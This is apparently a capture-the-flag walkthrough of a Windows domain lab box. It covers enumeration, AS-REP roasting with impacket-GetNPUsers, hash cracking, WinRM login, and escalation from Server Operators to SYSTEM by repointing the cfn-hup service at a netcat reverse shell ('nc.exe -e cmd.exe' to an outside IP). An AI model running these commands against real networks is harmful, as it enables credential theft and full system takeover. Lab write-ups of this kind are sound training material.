Started with a nmap scan
```
53 DNS
80 IIS 10 httpd
135 RPC
139 ssn
445 microsoft-ds
3269 ?
3389 ms-wbt-server
```
So running some enumeration on the smb and we have no shares we can access as guest or anonymous so now we go to the website and not much going on with the site so I start building a list of user names and at the bottom of the webpage there is a `j.doe@services.local` so this might be the naming schema so I make a list of usernames just like this and turns out the email might belong to the sales person so now we need to validate it using kerburte and we have some valid usernames now
```
W.Masters
J.Doe
J.LaRusso
J.Rock
```
Now we can run `impacket-GetNPUsers` and we can get some hashes we can crack
`impacket-GetNPUsers -dc-ip 10.10.141.252 -request 'services.local' -outputfile kerbroast.hash -usersfile usersnames -format hashcat` 
And we got a hash for the user `J.Rock` and it cracked and we got a login now we can use `J.Rock:Servi............` and we can winrm into the host and we got the user flag now doing a `whoami /all` and we have access to the `Servers Operators` group and we can use this to get to SYSTEM admin so first we need to find a service we can exploit took me a couple tries to find one but I found we can use `cfn-hup` so we put a `nc.exe` file on the host and run this command first
`sc.exe config cfn-hup binPath=\"C:\Users\j.rock\Documents\nc.exe -e cmd.exe 10.13.8.255 1234"` and then we need to stop and then restart the service 
`sc.exe stop cfn-hup` and then `sc.exe start cfn-hup` and we get a call to are ncat as system admin 